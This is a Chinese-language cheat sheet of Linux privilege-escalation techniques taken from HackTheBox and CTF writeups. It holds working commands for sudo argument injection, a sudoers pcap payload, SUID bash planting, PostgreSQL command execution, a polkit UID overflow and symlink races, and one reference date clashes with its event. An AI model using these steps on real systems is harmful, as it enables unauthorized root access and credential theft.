# Linux 权限提升和服务利用

来自 HackTheBox 机器 writeup 的技术，涵盖 sudo 滥用、服务配置错误、数据库利用和凭证提取。

## 目录

- [通过 fnmatch 的 sudo 通配符参数注入 (Dump HTB)](#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb)
- [为 /etc/sudoers.d 制作的 Pcap (Dump HTB)](#crafted-pcap-for-etcsudoersd-dump-htb)
- [Monit confcheck 进程命令行注入 (Zero HTB)](#monit-confcheck-process-command-line-injection-zero-htb)
- [Apache -d 参数最后生效覆盖 ServerRoot (Zero HTB)](#apache--d-last-wins-serverroot-override-zero-htb)
- [备份 Cronjob SUID 滥用 (Slonik HTB)](#backup-cronjob-suid-abuse-slonik-htb)
- [PostgreSQL COPY TO PROGRAM 远程代码执行 (Slonik HTB)](#postgresql-copy-to-program-rce-slonik-htb)
- [PostgreSQL 备份凭证提取 (Slonik HTB)](#postgresql-backup-credential-extraction-slonik-htb)
- [SSH Unix Socket 隧道 (Slonik HTB)](#ssh-unix-socket-tunneling-slonik-htb)
- [NFS 共享敏感数据利用 (Slonik HTB)](#nfs-share-exploitation-for-sensitive-data-slonik-htb)
- [PaperCut 打印部署权限提升 (Bamboo HTB)](#papercut-print-deploy-privilege-escalation-bamboo-htb)
- [Squid 代理内网服务跳转 (Bamboo HTB)](#squid-proxy-pivoting-to-internal-services-bamboo-htb)
- [通过 MySQL 重置 Zabbix 管理员密码 (Watcher HTB)](#zabbix-admin-password-reset-via-mysql-watcher-htb)
- [WinSSHTerm 加密凭证解密 (Atlas HTB)](#winsshterm-encrypted-credential-decryption-atlas-htb)
- [sudo file -m Magic File 目录遍历 (OTW Advent 2018)](#sudo-file--m-magic-file-directory-traversal-otw-advent-2018)
- [CVE-2018-19788 — polkit UID 整数溢出 → Systemd RCE (OTW Advent 2018)](#cve-2018-19788--polkit-uid-integer-overflow--systemd-rce-otw-advent-2018)
- [通过 vim 的 sudo Glob 路径 + 符号链接混淆代理 (STEM CTF 2019)](#sudo-glob-path--symlink-confused-deputy-via-vim-stem-ctf-2019)
- [FileChecker 上的 TOCTOU 符号链接交换竞态 (STEM CTF 2019)](#toctou-symlink-swap-race-on-filechecker-stem-ctf-2019)

---

## 通过 fnmatch 的 sudo 通配符参数注入 (Dump HTB)

Sudo 的 `fnmatch()` 会跨参数边界匹配 `*`，包括空格，从而允许向受限的 sudo 命令注入额外的标志。

示例：sudoers 规则包含 `/usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID]` — 其中 `*` 会匹配 `x -Z root -r/path -w/etc/sudoers.d`

- `-Z root` 防止权限降级（文件保持 root 拥有）
- 第二个 `-w` 会覆盖第一个（tcpdump 使用最后一个值）
- `-r` 从制作的 pcap 文件读取，而非实时捕获

```bash
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/.../crafted.pcap \
  -w/etc/sudoers.d/output_uuid \
  -F/var/cache/captures/filter.uuid
```

**关键洞察：** sudo 通配符使用的 `fnmatch()` 没有启用 `FNM_PATHNAME`，因此 `*` 可以匹配包括空格和斜杠在内的任意字符。这意味着 sudoers 规则中的单个 `*` 可以跨多个注入的参数匹配。

---

## 为 /etc/sudoers.d 制作的 Pcap (Dump HTB)

Sudo 的 yacc 解析器具有错误恢复能力——它会跳过二进制垃圾行并继续解析有效条目。相比之下，Vixie cron 在遇到第一个语法错误时会拒绝整个文件。制作一个包含嵌入 sudoers 行的 pcap：`\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n`

避免在二进制头中出现 `0x0a`（换行符）字节：使用类似 192.168.x.x（而非 10.x.x.x）的 IP，并谨慎选择端口和时间戳。有效的 sudoers 条目出现在二进制垃圾行之间。

```python
# 每个 UDP 包中嵌入的载荷
payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
# 避免使用 10.x.x.x IP（0x0a 字节 = 二进制头中的换行符）
# 使用 192.168.1.1/192.168.1.2，端口 12345/9999，时间戳 100-109
```

**关键洞察：** sudo 的解析器能从错误中恢复（yacc 的 `error` 产生式跳到下一个换行符），而 cron 的解析器在遇到第一个语法错误时会拒绝整个文件。这使得 `/etc/sudoers.d/` 成为二进制格式文件注入的可行目标，而 `/etc/cron.d/` 则行不通。

---
## Monit confcheck 进程命令行注入（Zero HTB）

Monit 每 60 秒以 root 身份运行健康检查脚本。该脚本使用 `pgrep -lfa` 查找匹配正则表达式的进程，提取其命令行，修改（例如，将 `apache2` 替换为 `apache2ctl`），并以 root 身份执行结果。

创建一个带有注入额外标志的伪造进程命令行。Perl 的 `$0` 赋值可以设置一个任意的进程名，`pgrep` 可见：

```bash
# Monit confcheck 脚本模式：
# pgrep -lfa "^/opt/app/bin/apache2.-k.start.-d./opt/app/conf"
# -> 替换 apache2->apache2ctl，追加 -t，作为 root 执行

# 通过伪造进程注入额外标志：
perl -e '$0 = "/opt/app/bin/apache2 -k start -d /opt/app/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log"; sleep 300' &
```

**关键洞察：** 当 root 脚本使用 `pgrep` 提取进程命令行并执行修改后的版本时，创建带有额外参数的伪造进程可以向 root 执行的命令注入标志。Perl 的 `$0` 或 Python 的 `setproctitle` 使进程名伪装变得简单。

---

## Apache -d 最后生效的 ServerRoot 覆盖（Zero HTB）

当指定多个 `-d` 标志时，Apache 使用最后一个。结合 `-E`（启动错误日志重定向），这既能控制配置又能捕获输出。在恶意配置中放置 `Include /root/root.txt` — Apache 会尝试将该文件作为指令解析，并在错误信息中转储其内容。

```bash
# 创建恶意 Apache 配置
mkdir -p /dev/shm/malconf
cat > /dev/shm/malconf/apache2.conf << 'EOF'
ServerRoot "/etc/apache2"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
Include /root/root.txt
EOF

# 伪造进程注入 -d（覆盖 ServerRoot）和 -E（错误日志输出到可读文件）
# monit 触发 confcheck 后，读取错误日志：
cat /dev/shm/malconf/startup.log
# AH00526: Syntax error on line 1 of /root/root.txt:
# Invalid command 'FLAG_CONTENT_HERE'...
```

**关键洞察：** Apache 配置解析错误会在错误信息中暴露文件内容。`Include /path/to/file` 使 Apache 读取该文件并将其内容作为“无效指令”错误报告——结合 `-E` 输出重定向，这是一个可靠的文件读取原语。

---

## 备份 Cronjob SUID 滥用（Slonik HTB）

Root 的 cronjob 会从用户可控目录（例如 PostgreSQL 数据目录）复制文件。将一个带 SUID（设置用户 ID）位的 bash 二进制放入源目录——当 cronjob 复制它时，文件变为 root 拥有且保留 SUID 位。

```sql
-- 复制带 SUID 的 bash 到 PostgreSQL 数据目录
COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && chmod 4777 /var/lib/postgresql/14/main/bash';
-- 备份 cronjob 运行后，/opt/backups/current/bash 拷贝为 root 拥有的 SUID 文件
-- 执行：/opt/backups/current/bash -p
```

**关键洞察：** 当 root cronjob 复制整个目录时，文件所有权变为 root。源目录中的 SUID 二进制在目标目录中变为 root 拥有的 SUID。bash 的 `-p` 标志可保留有效 UID。

---

## PostgreSQL COPY TO PROGRAM RCE（Slonik HTB）

PostgreSQL 超级用户可以通过 `COPY TO PROGRAM` 执行操作系统命令。通过写入临时文件并使用 `pg_read_file()` 读取命令输出。

```sql
-- 以 postgres 用户执行命令
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
-- uid=115(postgres) gid=123(postgres)

-- 读取任意文件
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/user.txt');
```

**关键洞察：** PostgreSQL 超级用户权限等同于操作系统命令执行权限。`COPY TO PROGRAM` 以 `postgres` 用户身份运行 shell 命令，`pg_read_file()` 可读取文件系统上的任意文件，无需 shell 访问。

---
## PostgreSQL 备份凭据提取（Slonik HTB）

`pg_basebackup` 归档包含 `pg_authid`（文件 `global/1260`）中的密码哈希。SCRAM-SHA-256 哈希（格式：`SCRAM-SHA-256$4096:salt$stored_key:server_key`）可以离线破解。使用 Docker 本地还原备份以访问完整数据库内容。

```bash
# 挂载 NFS 共享，解压备份压缩包
showmount -e TARGET && mount -t nfs TARGET:/var/backups /mnt
# 从 global/1260 中提取 pg_authid 以获取密码哈希
# 还原备份：docker run -v /path/to/backup:/var/lib/postgresql/data postgres:14
# 连接并导出用户表以获取凭据
```

**关键点：** PostgreSQL 备份（`pg_basebackup`）包含 `global/1260`，该文件保存 `pg_authid` —— 包含所有密码哈希的表。SCRAM-SHA-256 哈希可离线破解，且在 Docker 中还原完整备份可访问所有数据库内容，包括应用凭据。

---

## SSH Unix Socket 隧道（Slonik HTB）

当服务仅监听 Unix socket（非 TCP）时，使用 SSH 本地端口转发将流量隧道到该 socket。即使用户登录 shell 是 `/bin/false`，使用 `-T -fN` 参数也能跳过终端分配和命令执行。

```bash
# 将本地端口 25432 转发到远程 PostgreSQL Unix socket
sshpass -p 'password' ssh -T -o StrictHostKeyChecking=no \
  -fNL 25432:/var/run/postgresql/.s.PGSQL.5432 user@TARGET
# 通过转发端口连接
PGPASSWORD='postgres' psql -h localhost -p 25432 -U postgres
```

**关键点：** SSH 的 `-L localport:unix_socket_path` 不仅能转发 TCP 端口，也能转发 Unix socket。`-T` 禁止分配终端，`-f` 后台运行 SSH，`-N` 不执行命令 —— 这些参数组合使其在受限 shell（如 `/bin/false`）下也能工作。

---

## NFS 共享敏感数据利用（Slonik HTB）

枚举并挂载 NFS（网络文件系统）共享，查找数据库备份、SSH 密钥和带凭据的配置文件：
```bash
showmount -e TARGET
# /var/backups (所有人)
# /home        (所有人)
mount -t nfs TARGET:/var/backups /mnt/backups
mount -t nfs TARGET:/home /mnt/home
# 检查：数据库备份、SSH 密钥、带凭据的配置文件
```

**关键点：** NFS 共享若以 `(everyone)` 方式导出，无需认证即可访问。枚举时务必尽早使用 `showmount -e` —— 暴露的 `/home` 目录通常包含 SSH 密钥，`/var/backups` 常存有带凭据的数据库转储。

---

## PaperCut 打印部署权限提升（Bamboo HTB）

root 拥有的 systemd 服务（`pc-print-deploy`）从用户拥有的目录（`/home/papercut/`）运行二进制文件。`server-command` shell 脚本由 `papercut` 用户拥有，在某些管理员操作时以 root 身份执行。修改该用户拥有的脚本注入 payload，然后通过管理员 API 触发执行。

```bash
# 修改 root 执行的用户拥有脚本
echo 'chmod u+s /bin/bash' >> ~/server/bin/linux-x64/server-command

# 通过 PaperCut 管理员 API 触发 root 执行
curl -c /tmp/cookies.txt "http://localhost:9191/app?service=page/SetupCompleted"
curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityServers/v2?refresh=true"

# 执行 SUID bash
bash -p
```

**关键点：** 当 root 拥有的服务从用户可写目录运行二进制或脚本时，检查执行路径中每个文件的 `ls -la` 权限。systemd 服务文件（`/etc/systemd/system/`）定义了 `ExecStart`，但可能缺少 `User=` 指令，导致所有内容以 root 身份运行。

---

## Squid 代理转发至内部服务（Bamboo HTB）

通过 Squid 代理路由流量，访问无法直接访问的内部服务：
```bash
# 通过 Squid 代理枚举内部服务
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
curl -x http://TARGET:3128 http://127.0.0.1:8080/
# 为所有工具设置代理：
export http_proxy=http://TARGET:3128
```

**关键点：** 监听 3128 端口的 Squid 代理是访问绑定到 127.0.0.1 的内部服务的跳板。全局设置 `http_proxy`，即可访问外部扫描看不到的内部管理面板、数据库和 API。

---
## 通过 MySQL 重置 Zabbix 管理员密码（Watcher HTB）

通过 MySQL 访问 Zabbix 数据库，直接重置管理员密码：
```sql
-- 将 Zabbix 管理员密码重置为 "zabbix"（bcrypt 哈希）
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
-- 注意：用户名区分大小写（是 "Admin" 不是 "admin"）
```

**关键洞察：** 直接访问 Zabbix 数据库的 MySQL，可以更新 `users` 表，将管理员密码设置为已知的 bcrypt 哈希。用户名区分大小写（`Admin` 不是 `admin`），这是常见的陷阱。

---

## WinSSHTerm 加密凭据解密（Atlas HTB）

WinSSHTerm（.NET）将加密的 SSH 凭据存储在 `connections.xml` 中，密钥材料存放在一个 `key` 文件。使用 ILSpy/dnSpy 反编译以逆向多层加密：

1. **第一层：** 使用 PBKDF2-HMAC-SHA1（基于密码的密钥派生函数 2）解密 key 文件，迭代次数为 1012，密码由混淆前缀 + 主密码 + 后缀组成，使用硬编码盐值
2. **第二层：** 解密后的 key 分割为 PasswordKey（偶数字节，按位取反）和 SaltKey（奇数字节，按位取反）
3. **第三层：** 存储的密码使用基于 PasswordKey/SaltKey 派生的 PBKDF2 解密
4. 主密码通常可以用 rockyou.txt 破解
5. XOR 混淆字符串表：`data[i] = (data[i] ^ i) ^ 0xAA`

**关键洞察：** 桌面 SSH 客户端的“加密”凭据存储安全性取决于主密码强度。反编译 .NET 二进制文件，提取加密常量，暴力破解主密码。如果主密码弱，加密方案的复杂性无关紧要。

---

## sudo file -m 魔术文件目录遍历（OTW Advent 2018）

**模式：** sudoers 规则允许 `file` 命令且无参数限制。`file -m <path>` 命令告诉它从用户指定目录读取“magic”定义，即使目标文件不可读，也会在错误消息中输出该目录下的文件名。

```bash
sudo -u santa file -m /root/ .
# 错误输出列出 /root/ 下的所有文件名
```

结合 `file -m /path/to/file -i -r .` 使用，当 file 命令尝试将条目编译为 magic 时，可以将文件内容读入错误通道。

**关键洞察：** sudoers 审计通常只关注主二进制文件，而忽略其次级参数。`file -m`、`tar --to-command`、`find -exec` 和 `awk -f` 都能将无害的 sudo 规则变成目录遍历或命令执行。使用 `sudo -l` 枚举 sudo 规则，然后查阅 GTFOBins 以利用每条规则。

**参考：** OverTheWire Advent 2018 — Lostpresent，writeup 12785

---

## CVE-2018-19788 — polkit UID 整数溢出 → Systemd 远程代码执行（OTW Advent 2018）

**模式：** polkit 将大于 `INT_MAX`（`2147483647`）的 UID 视为“未知用户”，并*跳过*认证。创建 UID 为 `4020181224` 的用户，然后运行 `systemctl enable --now /path/to/pwn.service` — polkit 允许调用通过且不提示，systemd 以 root 身份运行该服务。

```bash
useradd -u 4020181224 -m loluser
su loluser
# ~/pwn.service:
# [Service]
# ExecStart=/bin/bash -c 'cat /root/flag > /tmp/out'
systemctl enable --now /home/loluser/pwn.service
cat /tmp/out
```

**关键洞察：** 任何基于整数的权限检查，如果用有符号整数比较，UID > INT_MAX 时都会出错。修补后的 polkit 将无效 UID 视为 root 的对立面——*始终拒绝*。记住数字常量 4020181224，能让你迅速识别易受攻击的机器。

**参考：** OverTheWire Advent Bonanza 2018 — writeup 12764

---
## Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)

**模式：** `/etc/sudoers` 授权 vim 使用一个通配路径 — `ctf ALL=(root) NOPASSWD: /usr/bin/vim /home/ctf/*/*/HackMe2.txt`。通配符限制的是*路径名*，而不是*它所指向的文件*。创建任何匹配该路径的符号链接指向 `/root/flag.txt`，vim 会愉快地解析该链接并以 root 权限打开真实目标文件。

```bash
# 设置匹配 /home/ctf/*/*/HackMe2.txt 的目录树
mkdir -p ~/a/b
ln -s /root/flag.txt ~/a/b/HackMe2.txt

# sudo 解析路径字符串，但 open() 会跟随符号链接
sudo /usr/bin/vim /home/ctf/a/b/HackMe2.txt
# 在 vim 中执行 :!cat % 会打印 /root/flag.txt 的内容
```

**关键洞察：** Sudoers 的路径匹配发生在字面 argv 字符串上，但二进制程序本身会解析符号链接。任何使用通配符的“仅编辑此文件”sudo规则都可以通过这种方式被利用——不仅限于 vim（还包括 `less`、`cat`、`head`、`tail`、`cp`、`chmod`、`truncate`，以及任何调用 open() 打开路径的工具）。防御措施需要使用 `secure_path`，避免使用通配符的绝对路径，理想情况下使用调用 `realpath()` 并检查白名单的文件读取辅助程序。

**参考：** STEM CTF: Cyber Challenge 2019 — 2014年1月8日，writeup 13301

---

## TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)

**模式：** 一个 setuid 二进制程序先用 `stat()` 检查路径的所有权/权限，然后才调用 `open()`（或反过来）——经典的检查时刻/使用时刻（Time-Of-Check / Time-Of-Use）竞态窗口。并行运行两个紧密循环：一个快速在一个通过检查的假文件和攻击者无法读取的 `/root/flag.txt` 之间切换符号链接，另一个调用检查程序并 grep 标志标记。最终两者对齐，检查程序在假文件验证通过时读取到了 flag。

```bash
# redirect.sh — 不断切换符号链接
while true; do
    ln -sf dummy.txt link
    ln -sf /root/flag.txt link
done &

# runfile.sh — 不断调用易受攻击的二进制；当泄露 MCA{ 时打印
while true; do
    ./FileChecker link 2>/dev/null | grep -m1 'MCA{' && break
done
```

在同一个 shell 中并发运行它们（`./redirect.sh &` 然后 `./runfile.sh`）并等待——通常几秒到一分钟。若循环太慢，可用 `renameat2(RENAME_EXCHANGE)` 或 userfaultfd/inotify 同步交换来加快竞态。

**关键洞察：** 任何对路径的两次系统调用访问模式（如先 `stat()` 再 `open()`，先 `access()` 再 `fopen()`）都存在竞态风险。特别是 `access(2)` 明确文档说明不安全，不能用于安全决策。防御方法是使用 `openat()` + 返回的 fd 上的 `fstat()`，或使用 `O_NOFOLLOW` 完全拒绝符号链接。作为攻击者，可以用 bash 循环或使用 `renameat2` 的 C 程序以约 100万次/秒的速度切换符号链接。

**参考：** STEM CTF: Cyber Challenge 2019 — Race You，writeup 13376
